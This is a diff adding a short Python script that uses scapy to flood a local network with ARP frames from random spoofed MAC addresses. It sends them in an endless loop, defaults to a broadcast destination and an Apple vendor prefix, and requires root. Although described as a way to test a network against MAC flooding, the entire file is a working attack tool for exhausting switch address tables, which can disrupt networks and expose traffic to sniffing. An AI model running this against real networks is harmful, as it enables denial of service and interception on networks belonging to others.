@@ -1,0 +1,43 @@
+#!/usr/bin/env python3
+# Flooding an indicated address with fake MACs
+# (c) volgk
+
+from scapy.all import *
+
+def macflood(interface, destMAC, vendor):
+    while 1:
+        randMAC = vendor + ':'.join(RandMAC().split(':')[3:])
+        print(randMAC)
+        sendp( Ether   (src=randMAC, dst=destMAC)            /
+               ARP     (op=2, psrc="0.0.0.0", hwdst=destMAC) /
+               Padding (load="X"*18),
+               iface=interface,
+               verbose=0 )
+
+
+if __name__ == '__main__':
+    import argparse
+
+    parser = argparse.ArgumentParser (add_help=True,
+             description="Test your network against MAC Address Flooding Attack")
+    parser.add_argument ('-i', default=get_working_if(),
+                               help=f"interface name.                \
+                                      Default: {get_working_if()}")
+    parser.add_argument ('-m', default="FF:FF:FF:FF:FF:FF",
+                               help='destination MAC.                \
+                                     Default: FF:FF:FF:FF:FF:FF')
+    parser.add_argument ('-v', default="b8:e8:56:",
+                               help='vendor (first 3 MAC digits that \
+                                     represent the vendor).          \
+                                     Default: b8:e8:56: (Apple)')
+    args = parser.parse_args()
+
+    if os.getuid() != 0:
+        print ("Must be superuser.")
+        sys.exit(1)
+
+    macflood (args.i, args.m, args.v)
+
+
+# vim:sw=4:ts=4:sts=4:et:cc=80
+# End of file
